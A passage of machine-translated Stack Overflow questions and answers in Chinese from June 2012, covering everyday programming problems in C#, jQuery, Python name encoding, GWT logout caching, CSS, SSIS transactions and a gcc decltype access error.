我不在好uri上。正确的插入必须在[https://www.googleapis.com/calendar/v3/calendars](https://www.googleapis.com/calendar/v3/calendars)

而不是[https://www.googleapis.com/calendar/v3/users/me/calendarList](https://www.googleapis.com/calendar/v3/users/me/calendarList)。

代码是：

```
 Calendar newCal = new Calendar();
    newCal.setSummary(calTitle);
    newCal.setTimeZone("Europe/Paris");

    Calendar createdCalendar = null;
    try {
        createdCalendar = service.calendars().insert(newCal).execute();
    } catch (Exception e){
        e.printStackTrace();
    } 
```

# c# - 按嵌套表分组

> ID：11052798
> 
> 赞同：0
> 
> 时间：2012-06-15T14:36:25.353
> 
> 标签：c#, linq, entity-framework-4

我有以下表格

```
[Order]
[Product]
    ProductId
[OrderDetails]
    OrderId
    ProductId
    Quantity 
```

我必须使用 Order 对象来获取包含按销售额分组的总产品销售额的列表

```
public class ProductSales 
{
    public decimal Total { get; set; }
    public Product Product { get; set; }
} 
```

给定一个订单对象列表，我如何选择其产品详细信息，然后按产品对销售进行分组？

我当前的代码如下所示：

```
return Orders
       .Select(ordeDetail => new {
           Detail = ordeDetail.OrderDetails
                        .GroupBy(w => new {
                            Detail = w,
                             Product = w.Product})
        .Select (group => new ProductSales {
            Product = group.Key.Product, 
            Quantity = group.Sum(r => r.Quantity)
        })
        .ToList(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:51:13.107

您可以按产品分组（按其 ID 或仅按整行）：

```
return Orders
   .Select(ordeDetail => new {
       Detail = ordeDetail.OrderDetails
                    .GroupBy(w=>w.Product)
                    .Select(w=>new ProductSales {
                       Product=w.Key,
                       Total=w.Sum(prod=>prod.Quantity) })
   })
   .ToList(); 
```

# javascript - 使用 JQuery 获取所有数据绑定值

> ID：11052806
> 
> 赞同：4
> 
> 时间：2012-06-15T14:36:49.987
> 
> 标签：javascript, jquery, forms, object, properties

```
 function getDbValue()
{
    alert($('[data-bind]').length);
    alert($('[data-bind][0].data-bind'));
    alert($('[data-bind][0].value'));
    jQuery.each($('[data-bind]'), function(databind,key)
    {
        alert(key);
        alert(databind);
        alert(databind[key].data-bind);
    })

} 
```

以上是我的功能，我想读取所有具有数据绑定属性的输入，例如

```
<input type="text" id="frmIn1-Officer" data-bind="value: AOfficer" class="InputText"/> 
```

^ 运行我的函数时，我希望它返回“AOfficer”，因为这是数据绑定值。

所以一个例子是

```
<input type="text" id="frmIn1-Officer" data-bind="value: AOfficer1" class="InputText"/>
<input type="text" id="frmIn1-Officer" data-bind="value: AOfficer2" class="InputText"/>
<input type="text" id="frmIn1-Officer" data-bind="value: AOfficer3" class="InputText"/>
<input type="text" id="frmIn1-Officer" data-bind="value: AOfficer4" class="InputText"/>
<input type="text" id="frmIn1-Officer" data-bind="value: AOfficer5" class="InputText"/>
<input type="text" id="frmIn1-Officer" data-bind="value: AOfficer6" class="InputText"/> 
```

在 for each 循环中，我希望能够使用数据绑定的值。例如 values[0] = 'AOfficer1'

抱歉，如果我的解释有点混乱，我的想法很完美，但试图把它写下来要困难得多。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-15T14:45:20.150

jQuery 对“data-something”属性的解释与其他属性不同。因此，您应该选择所有元素并查找它们的数据绑定，如下所示：

```
$(document).ready(function(){
    $('input.InputText').each(function(){
        var input = $(this);
        if ($(input).data().bind) {
            alert($(input).data().bind);
        }
    });
});​ 
```

然后你可以进行字符串操作来解析你的值，我建议使用 JSON 并像一个对象一样加载它。这是一个工作小提琴：http: [//jsfiddle.net/3NERK/6/](http://jsfiddle.net/3NERK/6/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-15T14:44:06.523

`data-bind`您可以通过 jQuery 属性选择器 -搜索具有属性的任何元素，`$("[data-bind]")`然后对其进行迭代并从中`.each()`构造`dataBinds`数组，从而去除`value:`每个值。

这可以解决问题：

```
dataBinds = [];
$("[data-bind]").each(function(){
     dataBinds.push($(this).attr("data-bind").substring(7));
});​​​​​​ 
```

我已经建立了一个例子：http: [//jsfiddle.net/dvirazulay/YPnwQ/](http://jsfiddle.net/dvirazulay/YPnwQ/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:44:17.817

```
$( "[data-bind]" ).each( function() {
    var elem = $( this );
    alert( elem.data( "bind" ) );
}); 
```

[http://jsfiddle.net/NhNhK/](http://jsfiddle.net/NhNhK/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-15T14:45:47.503

获取所有具有`data-bind`属性的元素：`$('[data-bind]')`

迭代这些元素并操作 data-bind 属性：

```
$('[data-bind]').each(function(element,index){
  var data_bind = $(element).data('bind');
  alert(data_bind);
}) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-15T14:45:45.697

您可以使用[`.data()`](http://api.jquery.com/jQuery.data/)with 方法`.each()`来完成此操作。

[**演示**](http://jsfiddle.net/EFXJA/1/)

```
$('input').each(function() {
    var $this = $(this);

    alert($this.data('bind').replace("value: ", ""));            
});​ 
```

# python - 有没有更快的方法将数字转换为名称？

> ID：11052808
> 
> 赞同：8
> 
> 时间：2012-06-15T14:37:03.077
> 
> 标签：python, namespaces, converter

以下代码定义了映射到数字的名称序列。它旨在获取一个数字并检索特定名称。该类通过确保名称存在于其缓存中来操作，然后通过索引到其缓存中返回名称。这里的问题是：**如何在不存储缓存的情况下根据数字计算名称？**

该名称可以被认为是一个以 63 为基数的数字，除了第一个数字始终以 53 为基数。

```
class NumberToName:

    def __generate_name():
        def generate_tail(length):
            if length > 0:
                for char in NumberToName.CHARS:
                    for extension in generate_tail(length - 1):
                        yield char + extension
            else:
                yield ''
        for length in itertools.count():
            for char in NumberToName.FIRST:
                for extension in generate_tail(length):
                    yield char + extension

    FIRST = ''.join(sorted(string.ascii_letters + '_'))
    CHARS = ''.join(sorted(string.digits + FIRST))
    CACHE = []
    NAMES = __generate_name()

    @classmethod
    def convert(cls, number):
        for _ in range(number - len(cls.CACHE) + 1):
            cls.CACHE.append(next(cls.NAMES))
        return cls.CACHE[number]

    def __init__(self, *args, **kwargs):
        raise NotImplementedError() 
```

以下交互式会话显示了一些预期按顺序返回的值。

```
>>> NumberToName.convert(0)
'A'
>>> NumberToName.convert(26)
'_'
>>> NumberToName.convert(52)
'z'
>>> NumberToName.convert(53)
'A0'
>>> NumberToName.convert(1692)
'_1'
>>> NumberToName.convert(23893)
'FAQ' 
```

不幸的是，这些数字需要映射到这些确切的名称（以允许反向转换）。

* * *

**请注意：**接收可变数量的比特并将其明确转换为数字。此数字应明确转换为 Python 标识符命名空间中的名称。最终，有效的 Python 名称将被转换为数字，这些数字将被转换为可变位数。

* * *

**最终解决方案：**

```
import string

HEAD_CHAR = ''.join(sorted(string.ascii_letters + '_'))
TAIL_CHAR = ''.join(sorted(string.digits + HEAD_CHAR))
HEAD_BASE, TAIL_BASE = len(HEAD_CHAR), len(TAIL_CHAR)

def convert_number_to_name(number):
    if number < HEAD_BASE: return HEAD_CHAR[number]
    q, r = divmod(number - HEAD_BASE, TAIL_BASE)
    return convert_number_to_name(q) + TAIL_CHAR[r] 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-15T15:32:15.303

这是一个充满 1 个错误的有趣小问题。

没有循环：

```
import string

first_digits = sorted(string.ascii_letters + '_')
rest_digits = sorted(string.digits + string.ascii_letters + '_')

def convert(number):
    if number < len(first_digits):
        return first_digits[number]

    current_base = len(rest_digits)
    remain = number - len(first_digits)
    return convert(remain / current_base) + rest_digits[remain % current_base] 
```

和测试：

```
print convert(0)
print convert(26)
print convert(52)
print convert(53)
print convert(1692)
print convert(23893) 
```

输出：

```
A
_
z
A0
_1
FAQ 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-15T15:31:48.360

你得到的是一种损坏的[双射计数](http://en.wikipedia.org/wiki/Bijective_numeration)形式（通常的例子是电子表格列名，它是双射 base-26）。

生成双射计数的一种方法：

```
def bijective(n, digits=string.ascii_uppercase):
    result = []
    while n > 0:
        n, mod = divmod(n - 1, len(digits))
        result += digits[mod]
    return ''.join(reversed(result)) 
```

您需要做的就是为`53 >= n > 0`. 您还需要将 n 增加 1，因为双射`0`是空字符串，而不是`"A"`：

```
def name(n, first=sorted(string.ascii_letters + '_'), digits=sorted(string.ascii_letters + '_' + string.digits)):
    result = []
    while n >= len(first):
        n, mod = divmod(n - len(first), len(digits))
        result += digits[mod]
    result += first[n]
    return ''.join(reversed(result)) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-15T15:25:07.797

测试前 10,000 个名称：

```
first_chars = sorted(string.ascii_letters + '_')
later_chars = sorted(list(string.digits) + first_chars)

def f(n):
    # first, determine length by subtracting the number of items of length l
    # also determines the index into the list of names of length l
    ix = n
    l = 1
    while ix >= 53 * (63 ** (l-1)):
        ix -= 53 * (63 ** (l-1))
        l += 1

    # determine first character
    first = first_chars[ix // (63 ** (l-1))]

    # rest of string is just a base 63 number
    s = ''
    rem = ix % (63 ** (l-1))
    for i in range(l-1):
        s = later_chars[rem % 63] + s
        rem //= 63

    return first+s 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-15T15:16:14.570

您可以使用[此](https://stackoverflow.com/a/1119769/355230)答案中的代码来回答“Python 中的 Base 62 转换”问题（或者可能是其他答案之一）。

使用引用的代码，我认为您*真正的*问题的答案是“**如何在不存储缓存的情况下根据数字计算名称？** ”将使名称成为可能带有前导下划线的数字的简单基 62 转换如果名称的第一个字符是数字（将名称转换回数字时会被忽略）。

这是说明我建议的示例代码：

```
from base62 import base62_encode, base62_decode

def NumberToName(num):
    ret = base62_encode(num)
    return ('_' + ret) if ret[0] in '0123456789' else ret

def NameToNumber(name):
    return base62_decode(name if name[0] is not '_' else name[1:])

if __name__ == '__main__':
    def test(num):
        name = NumberToName(num)
        num2 = NameToNumber(name)
        print 'NumberToName({0:5d}) -> {1!r:>6s}, NameToNumber({2!r:>6s}) -> {3:5d}' \
              .format(num, name, name, num2)

    test(26)
    test(52)
    test(53)
    test(1692)
    test(23893) 
```

输出：

```
NumberToName(   26) ->    'q', NameToNumber(   'q') ->    26
NumberToName(   52) ->    'Q', NameToNumber(   'Q') ->    52
NumberToName(   53) ->    'R', NameToNumber(   'R') ->    53
NumberToName( 1692) ->   'ri', NameToNumber(  'ri') ->  1692
NumberToName(23893) -> '_6dn', NameToNumber('_6dn') -> 23893 
```

如果数字可能是负数，您可能必须修改引用答案中的代码（并且那里有一些关于如何做到这一点的讨论）。

# javascript - 如何正确退出 GWT 应用程序以避免浏览器加载缓存数据？

> ID：11052809
> 
> 赞同：0
> 
> 时间：2012-06-15T14:37:03.847
> 
> 标签：javascript, gwt

我有一个基于 GWT 的企业 Web 应用程序，可以通过外部身份验证模块进行访问。我的问题是：

*   我使用登录页面登录到应用程序。
*   我被定向（使用反向代理规则）到我加载 GWT 应用程序的 Tomcat 服务器。
*   使用该应用程序。
*   我退出应用程序。
*   当我尝试重新登录时，我没有进入登录页面。

如果我再次输入登录页面的 URL，浏览器会开始加载我无法访问登录页面的缓存数据。我必须点击重新加载才能进入登录页面。怎么会这样？F5 告诉浏览器不要使用缓存有什么特别之处？

我知道代理不会被我的任何请求击中，这意味着浏览器所做的只是加载缓存的元素。

有人有任何线索吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-17T15:28:12.453

我没有清楚地理解你的问题，但我想我有一个类似的问题。我希望它对你有帮助。

我有我的 GwtPage.html 和 web.xml 中保护的所有 GWT 东西。

当我第一次访问[http://example.com/GwtPage.html](http://example.com/GwtPage.html)时，容器的安全性将我发送到 login.jsp。登录完成后，我被发送到 GwtPage.html，所以一切都很好。

但是 GwtPage.html 第二次被浏览器缓存并且容器没有向我发送 login.jsp。所以我做了以下事情：我只用一行创建了 index.jsp：

```
<%
    response.sendRedirect("GwtPage.html");
%> 
```

并将其添加到安全资源列表中。

浏览器不会缓存它，因此容器总是向我发送登录页面。

第二个好处是 GwtPage.html 仍然被浏览器缓存，这是非常好的，因为它很重。

我的 web.xml：

```
<welcome-file-list>
    <welcome-file>index.jsp</welcome-file>
</welcome-file-list>

<!-- Security -->
<security-constraint>
    <web-resource-collection>
        <web-resource-name>Index Page</web-resource-name>
        <url-pattern>/index.jsp</url-pattern>
    </web-resource-collection>    
    <web-resource-collection>
        <web-resource-name>Main Page</web-resource-name>
        <url-pattern>/GwtPage.html</url-pattern>
    </web-resource-collection>
    <web-resource-collection>
        <web-resource-name>Gwt entrails</web-resource-name>
        <url-pattern>/Gwt/*</url-pattern>
    </web-resource-collection>
    <auth-constraint>
        <role-name>VIEWER</role-name>
    </auth-constraint>
</security-constraint>

<login-config>
    <auth-method>FORM</auth-method>
    <realm-name>myrealm</realm-name>
    <form-login-config>
        <form-login-page>/LoginForm.jsp</form-login-page>
        <form-error-page>/LoginError.jsp</form-error-page>
    </form-login-config>
</login-config> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-07-11T22:05:25.913

我有同样的问题。注销后 GWT 模块未启动。

```
<a id="logout" href="${pageContext.request.contextPath}/j_spring_security_logout">Logout</a> 
```

解决方法很简单，打开登录页面前应该自动刷新

在**spring-security.xml中**

`<security:logout logout-success-url="/logout.html"/>`

**注销.html**

```
<head lang="en">
  <meta http-equiv="REFRESH" content="0;  url=login.html">
</head> 
```

# css - CSS - 下拉菜单（固定宽度）

> ID：11052814
> 
> 赞同：0
> 
> 时间：2012-06-15T14:37:21.767
> 
> 标签：css

请你看看这里的哈佛医学院网站 [http://hms.harvard.edu/](http://hms.harvard.edu/)

导航下拉菜单的最后一项具有子菜单未显示在其固定 div 之外。即：调整最后一项的子菜单位置，使其不会浮出。

如何在纯CSS中做到这一点？

希望你明白我在说什么。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:41:53.980

在该特定网站上，它是通过手动定位最后一个元素来完成的。

所有其他子菜单都`{ position: absolute; left: 0; }`只有最后一个`left: -91px`。您可以将一个类附加到最后一个菜单项（或使用`:last-child`但在较旧的 IE-s 中不起作用）并将其移动到左侧以适合主内容框。

# javascript - 在java脚本中编辑一个json文件

> ID：11052815
> 
> 赞同：0
> 
> 时间：2012-06-15T14:37:22.063
> 
> 标签：javascript, json, edit

是否可以使用 JavaScript 编辑 JSON 文件？

我正在尝试像这样读取我的 JSON 文件：

```
jQuery.getJSON('http://test.javascript.com/jscrud/json/test.json')
.done(function(data) {
    element.html("<form> ");
    $.each(data,function(k, v) {
        element.append(k+": <input type='test' name="+k+" value="+v+" /><br />");
    });
    element.append("</form>");
})
.fail(function(data) {
    alert("did not read file");
}); 
```

由此，创建并填充了一个表单。我希望能够编辑表单，单击“保存”并使用元数据更新 JSON 文件，说明已编辑的内容。

这是可能的还是我在浪费时间？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:39:01.607

您需要编写一个服务器端脚本，该脚本使用 AJAX 接收修改后的 JSON 并将其保存在服务器上的某个位置。

# django - 干草堆和谷歌应用引擎

> ID：11052819
> 
> 赞同：2
> 
> 时间：2012-06-15T14:37:38.350
> 
> 标签：django, google-app-engine, django-nonrel, django-haystack

我在 Django 中开发了一个应用程序，主要用于教育目的，我想将它托管在 GAE 上。该应用程序使用 MySql 和 Haystack/Whoosh。我正在关注这个[django-nonrel](http://www.allbuttonspressed.com/projects/djangoappengine)指南，但我不确定 Haystack/Whoosh 是否可以在 GAE 的 NoSQL 上工作。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-13T20:03:03.097

可以在 GAE 上使用 Haystack，但不能使用 whoosh 作为搜索后端。相反，您需要使用托管的 Solr 或 ElasticSearch 作为后端搜索服务器。试试 searchbox.io，他们会告诉你如何在[这里使用 Haystack](http://dev.searchbox.io/python/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T15:53:24.567

我不知道 appengine 上的 haystack，但有一个[nonrel-search](http://www.allbuttonspressed.com/projects/nonrel-search#docu)我设计用于 appengine 和 NoSQL 数据库。

另外我认为 GAE 不支持像 Mysql 这样的关系数据库。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-15T15:10:39.797

Whoosh 是一个基于文件的搜索后端，因此只要您对目录具有写入权限，就应该能够使用它。

您需要在 Django 应用程序中配置搜索索引的目录并运行适当的命令（`./manage.py rebuild_index`或`./manage.py update_index`）将搜索索引构建到该目录中。

# android - android 动画会使用更多的 CPU 资源吗？

> ID：11052822
> 
> 赞同：2
> 
> 时间：2012-06-15T14:37:40.187
> 
> 标签：android, android-animation, cpu-usage, battery

我`Animations`在我的应用程序中使用

1.  之间切换`Activities`
2.  填充`ListView`。

现在我想知道它是否使用更多`CPU power`，哪个使用更多`Battery`。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:59:24.850

嗯，cpu 的任何计算都会消耗电力，我必须相信你必须做更多的计算才能为这些项目设置动画，所以我会说是的，这会影响电池寿命。

我无法想象这会很激烈......人们使用动态壁纸，并且一些在网上搜索显示那些（取决于设备）可以使用额外的 2-4% 电源，这是运行 100 的东西可见的时间百分比，而不是在有限时间内发生的列表创建。

结果：我不会担心的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:57:18.877

当然可以，但我认为根本不重要。与启动活动或加载列表的整个过程相比，这些操作非常简单。如果您愿意，可以使用 traceview 对其进行测试。

[TraceView 示例](http://tech.any.do/android-performance-optimization/)

# c# - 当 .dll 写入文件时通知 UI？

> ID：11052823
> 
> 赞同：0
> 
> 时间：2012-06-15T14:37:41.907
> 
> 标签：c#, file, user-interface

我一直在想办法在我的 .dll 采取的每一步之后更新界面，但由于可能有多个 .dll（每个都在不同的时间运行），我不想让它们如此依附用户界面层。

[这是我最新的线程](https://stackoverflow.com/questions/11037645/how-do-i-dynamically-invoke-a-dll-method-that-receives-a-callback-as-parameter)，但架构非常混乱，所以我已经删除了通知逻辑。

**我的目标：**

1.  UI 动态调用 .dll（好的，这有效）
2.  .dll（在本例中为爬虫）执行其工作，并使用已知格式将每个步骤记录在文件中。（好的，这已经完成了）

3.  UI 层以某种方式“知道”或“定期检查”文件中的更改，并对其进行解析以在用户界面中显示文件内容（可能是 logbox 或我们）

我目前正在尝试实现第 3 点，在没有 .dll 过于附加/依赖于接口层的情况下如何做到这一点的任何提示？

**问题：**

1.  在接口层中读取文件以更新文件有什么缺点吗？

2.  当“文件更改”或类似的事情时，我可以检查处理任何事件吗？

3.  如果没有事件，我可以异步检查文件，读取它，解析它，并在 ui 中显示结果吗？

什么是明确/最好的方法？

**观察：**

在这里使用回调不是一个选项，因为我正在使用它，并且因为我的 url 层的“深度”，向上层触发和抛出事件将需要我 5-6 层才能到达用户界面本身。

提前致谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T14:40:29.377

`FileSystemWatcher`应该把你整理出来

# javascript - Facebook 发送按钮显示法语版页面的空白弹出窗口

> ID：11052826
> 
> 赞同：0
> 
> 时间：2012-06-15T14:37:45.353
> 
> 标签：javascript, facebook

我添加了 Facebook 发送按钮的代码。该按钮在页面的英文版上完美运行。在法语版本上，单击发送按钮时我得到一个空的空白弹出窗口。

[查看页面](http://hain-celestial.ca/Recipes/PastaAndBeanSaladwithTunaDressing)

HTML 代码：

```
<div id="fb-root"></div>
<div class="fb-send" 
        data-href="http://hain-celestial.ca/Recipes/PastaAndBeanSaladwithTunaDressing" 
        data-font="arial">
</div> 
```

JavaScript：

```
var facebookLang = "en_US";
(function (d, s, id) { 
    var js, 
        fjs = d.getElementsByTagName(s)[0]; 
    if (d.getElementById(id)) 
        return;
    js = d.createElement(s); 
    js.id = id; 
    js.src = "//connect.facebook.net/"+facebookLang+"/all.js#xfbml=1"; 
    fjs.parentNode.insertBefore(js, fjs); 
} (document, 'script', 'facebook-jssdk')); 
```

`var facebookLang = "en_US"`更改`fr_CA`为法语版页面。这部分有效，因为发送按钮文本是法语。

# .net - 使用枚举访问.net中的对象成员变量值

> ID：11052833
> 
> 赞同：0
> 
> 时间：2012-06-15T14:38:07.430
> 
> 标签：.net, reflection, properties

[编辑删除我需要访问 .net 属性（副成员变量）的暗示]

我正在尝试使用.net（具体来说是用C#编码的WPF）创建一个设计模式，其中类的实例（从基类派生）具有可以通过在方法调用中传递枚举值来访问的成员变量. 例如`myObject.GetValueOf(dimensionFields.Latitude)`将返回 myObject 持有的“纬度”值。显然，目的是`GetValueOf([some enum variable])`在运行时访问由枚举定义的许多字段值中的任何一个。我还需要相当高的性能，因为当许多（可能很容易超过 100,000 个）对象被绘制到显示器（通过 OpenGL）时，将访问这些值。

由于性能要求，我不愿意使用反射——这是一个合理的不情愿吗？

我有一个解决方案，但我的问题是：“他们是更好或更简单的方法吗？”

这是我当前的解决方案：我将为我想要访问的每种类型的成员变量创建枚举（即，一个用于双精度数，一个用于整数，一个用于字符串，一个用于布尔值等）。我的对象的基类将具有对应于每种变量类型的字典（例如，`Dictionary<FieldsForDoubles, double> m_doubleDict`）。该基类中的`GetValueOf([some enum value])`方法将被重载以接受每种类型的枚举并返回适当的数据类型（例如，`public double GetValueOf(FieldsForDoubles field)`）。为方便起见，派生类可以添加实际属性（例如，`Latitude`属性），但这些属性将简单地访问适当的字典。

最后，作为一次短途旅行，我可能会通过字符串值而不是枚举值来访问字典，让该`GetValueOf`方法通过使用访问字典`someEnumValue.ToString()`并提供通用方法 ( `GetVaueOf<type>(string variableName)`) 以允许某些派生类保存不在当前枚举中的变量但可以通过非常相似的模式访问（例如，我可以使用`GetValueOf<double>([some variable name])`访问任何使用此模式的变量）

任何人都看到这种方法的问题（例如，访问相当短的字典不是那种费用，对吧？）？关于如何做到这一点的任何其他想法？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T18:32:36.483

（首先，没有答案）就个人而言，我会努力开发一种方法来解决重新创建反射的需要。直接属性引用总是更快，因为它们保存了内存地址。任何类型的重定向或查找总是会更昂贵。

（这是一个答案）显然我们不知道您的要求或系统，所以这里有一个想法。如果您的属性是在枚举中定义的，那么理论上它们不会在运行时创建。所以与其使用字典，为什么不直接使用数组呢？如果你有

```
enum
  prop1 = 0
  prop2 = 1
  prop3 = 2 
```

那么你只需要一个长度为 3 的数组。当用户传递一个枚举时，将它用作数组的索引。

编辑：如果性能是您的主要驱动力，那么您需要为每种类型的变量创建不同的枚举，以便您的数组可以“强”类型（非对象）。然后，您需要为每种类型使用不同的功能。所以：

```
enum intProp
  prop1 = 0
  prop2 = 1
  prop3 = 2

enum floatProp
  prop1 = 0
  prop2 = 1
  prop3 = 2

int[] intVals
float[] floatVals

fun int getIntProp(intProp p)
  return intVals[(int)p]

fun float getFloatProp(floatProp p)
  return floatVals[(int)p] 
```

它并不漂亮，但它应该足够快以处理 100,000 个对象。不幸的是，我们必须经常平衡性能和可维护性。这是丑陋的代码，但漂亮整洁的代码几乎总是会对性能产生影响。

如果您想要真正的闪电性能，最好的选择是使用 C++ 并直接管理地址。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:55:56.053

如果我离开了，请告诉我，我会删除。为什么数据需要是属性、枚举和字典？为什么不只是 vcsjones 评论中的字典？您从属性开始，然后参考字段“字段值的数量”。目前尚不清楚您想要什么。您是否计划在运行时构建枚举和属性 - 如果是，您打算如何做到这一点？

可能的简化方法。

```
public class dynamicClass
{
    public Dictionary<string, string> DicString { get; private set; }
    public Dictionary<string, Int32>  DicInt32  { get; private set; }

    public string GetStringFromKey(string key) { return DicString[key]; } 
```

我看不到 GetStringFromKey 带来了什么。

在客户端 DicString[key]; 与 GetStringFromKey(key);

# transactions - SSIS 包可以加入现有的外部事务吗？

> ID：11052837
> 
> 赞同：1
> 
> 时间：2012-06-15T14:38:09.947
> 
> 标签：transactions, ssis, msdtc

我之前问过一个类似的问题（尽管特定于从 xp_cmdshell 运行包）。我对此事的最后评论是询问如果我想确保 SSIS 包参与事务，我的选择是什么。

那么，有什么方法可以让我执行一个 SSIS 包并让它参与到一个已经存在的事务中呢？

如果出于测试目的，我们想要这样做的原因是：

*   运行包以加载数据。
*   针对加载的数据运行测试。
*   将所有加载的数据回滚。

谢谢，斯图尔特。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T06:08:10.147

互联网对这个问题的解决方案非常安静。我遇到了同样的问题，到处寻找解决方案。SSIS 对错误操作时生成的错误消息也没有帮助（未记录的错误代码）。答案可能有点晚，但希望它能帮助某人避免浪费时间。这就是最终为我工作的原因。

例如，在单元测试中，将整个过程包装在 TransactionScope 中：

```
using (TransactionScope scope = new TransactionScope(TransactionScopeOption.RequiresNew,new TransactionOptions(){IsolationLevel =IsolationLevel.ReadCommitted}))
        { 
          Application app = new Application();
          Package package = app.LoadPackage(packageFileName, null);

          // Can set package settings for test
          package.TransactionOption = DTSTransactionOption.Required;
          package.IsolationLevel = IsolationLevel.ReadCommitted;

          // Use this overload for execute
          DTSExecResult result = package.Execute(null, null, null, null, TransactionInterop.GetDtcTransaction(Transaction.Current));

          // Test results here inside the scope
} 
```

当然，如果您想将数据添加到数据库中，您可以重新排列，然后通过 SSIS 提取它，然后在测试数据后回滚。

# html - IE中设置的渲染字段

> ID：11052841
> 
> 赞同：0
> 
> 时间：2012-06-15T14:38:21.163
> 
> 标签：html, css, internet-explorer, rendering

好吧，我有一个 div 标签，我显示为一个模式对话框，这个 div 标签包含一个字段集，而女巫又包含一个图例标签和一些 div 标签。

但是结果在 IE(9) 与 Opera、FF 和 Chrome 中呈现完全不同

IE：

![IE 字段集](../Images/af71bda8b704d02549aa662ea8f9e3ac.png)

歌剧：

![歌剧场集](../Images/8e133bf650c0c06fb3b68c9e496fe29e.png)

如何使 ie 以与 Opera、FF 和 chrome 相同的方式呈现？通过 html 调试，我发现“溢出：隐藏；” 是原因，但为什么这会使 IE9 Render 与 Opera FF 和 chrome 完全不同？

CSS：

```
.DynamicForm
{
    padding: 0;
    margin: 0;
    overflow: hidden;
}
.Dialog fieldset
{
    background: white;
    border: 0;
}

.Dialog fieldset
{
    margin: 0;
    padding: 3px 2px 13px 13px;
}

.Dialog fieldset legend
{
    padding: 3px 10px;
    margin: -3px 0px 3px;
    background: #BC2327;
    font-weight: bold;
    color: white;
}

.DialogBackground
{
    background-color:rgba(0,0,0,0.1);
} 
```

html:

```
<div class="DynamicForm Dialog">
  <fieldset>
    <legend>
            Allkort, 12 månader, Fullpris
        </legend>....... 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T13:35:53.843

我找到了一个解决方案，而不是使用溢出：隐藏。即使我完全讨厌它，我也改为使用普通的 clearfix ..

浏览器仍然呈现出一些不同但我对我所拥有的感到满意..

# c++ - 在 C++11 中使用 decltype() 时出错（在 gcc 4.7.0 中创建不透明的错误消息）

> ID：11052842
> 
> 赞同：14
> 
> 时间：2012-06-15T14:38:22.840
> 
> 标签：c++, c++11, auto, decltype

使用以下代码（我的原始代码的简化版本）

```
#include <iostream>
#include <cmath>

template <typename> class A;                  // edit 1 following Mark & Matthieu
template <typename X> class A {
  X a;
  template <typename> friend class A;         // edit 1 following Mark & Matthieu
public:
  A(X x) : a(x) {}
  X get() const { return a; }                // edit 2 to avoid using A<Y>::a
  template <typename Y>
  auto diff(A<Y> const& y) const
    -> decltype(a - y.a)                       // original code causing error with gcc
    -> typename std::common_type<X, Y>::type  // alternative following Rook
    -> decltype(this->get() -                 // edit 3 not using A<X>::a
                y.get())                     // edit 2 not using A<Y>::a
  { return a - y.get(); }
};

template <typename X, typename Y>
inline auto dist(A<X> const& x, A<Y> const& y) -> decltype(std::abs(x.diff(y)))
{ return std::abs(x.diff(y)); }

int main()
{
  A<double> x(2.0), y(4.5);
  std::cout << " dist(x,y)=" << dist(x,y) << '\n'; // <-- error here
} 
```

gcc 4.7.0 出现以下错误：

> test.cc: 在函数`decltype (std::abs(x.diff(y))) dist(const A<X>&, const A<Y>&)`中 [with `X = double; Y = double; decltype (std::abs(x.diff(y))) = double`]':
> 
> test.cc:5:5：错误：`double A<double>::a`是私有的
> 
> 突出显示的行：错误：在此上下文中

这个错误信息显然不是很有帮助。我的代码有错误吗？或者这是编译器的问题？

**EDIT1**：朋友声明没有帮助。

**EDIT2**：避免使用`A<Y>::a`也没有帮助。

**EDIT3**：与**EDIT2**一起终于**解决了这个问题**。的`decltype()`定义中`dist()`需要`decltype()`for `A<X>::diff()`，而后者又使用`A<X>::a`，它在第一个上下文中是私有的。

**EDTI4**：Rook 的使用建议`typename std::common_type<X,Y>::type`也有效！

**EDIT5**：但请参阅 Jonathan Wakely 对[这个问题的回答](https://stackoverflow.com/questions/11055350/what-is-better-to-use-for-automatic-return-types-decltype-or-stdcommon-type#comment14465455_11055350)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-15T14:44:38.977

**TL；DR：** Gcc[似乎有一个错误](http://ideone.com/NpF0F)，即模板成员函数上的尾随返回类型不被视为在类的范围内。

此错误导致 gcc 在实例化模板成员函数时失败，`auto diff(A<Y> const&y) const -> decltype(a-y.a)`因为`a`它是私有的，并且 gcc 认为私有成员在此处不可访问。

* * *

该代码使用 clang 和 VC++ 构建得很好，我没有看到任何试图访问`A<double>::a`外部的东西`A<double>`，所以对我来说它看起来像是一个 gcc 错误。

其他人已经提到`A<X>`并且`A<Y>`是不同的类，但这里不是这种情况，两者都是`A<double>`. 我相信这意味着在这种情况下不需要友谊，尽管在一般情况下工作`A<X>`确实需要与 A 的其他专业成为朋友。

具体来说，`a`in是一个从属名称，因此在已知`y.a`之前无法查找它。`A<Y>`此时查找完成，可访问性被测试，应该发现`A<double>`确实可以访问`A<double>::a`.

